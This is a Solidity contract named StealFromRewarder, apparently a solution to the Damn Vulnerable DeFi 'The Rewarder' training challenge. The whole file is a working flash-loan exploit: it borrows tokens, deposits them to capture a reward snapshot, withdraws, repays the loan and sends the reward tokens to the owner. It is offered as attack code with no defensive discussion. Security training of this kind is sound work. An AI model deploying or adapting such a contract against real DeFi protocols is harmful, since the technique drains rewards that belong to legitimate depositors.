// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import {RewardToken, AccountingToken, TheRewarderPool} from "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

/**
 * @title StealFromRewarder
 * @author Louis Law
 */
contract StealFromRewarder {
    address public immutable owner;
    FlashLoanerPool public immutable loanPool;
    TheRewarderPool public immutable rewardPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;

    // RewardToken private rewardToken;
    // AccountingToken private accountingToken;

    constructor(
        FlashLoanerPool _loanPool,
        TheRewarderPool _rewardPool,
        DamnValuableToken _liquidityToken
    ) {
        owner = msg.sender;
        loanPool = _loanPool;
        rewardPool = _rewardPool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardPool.rewardToken();
    }

    function executeFlashLoan(uint256 amount) public {
        loanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        // rewardPool.rewardToken.transfer(owner, amount);
        rewardPool.withdraw(amount);
        liquidityToken.transfer(msg.sender, amount);
        rewardToken.approve(owner, rewardToken.balanceOf(address(this)));
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
}
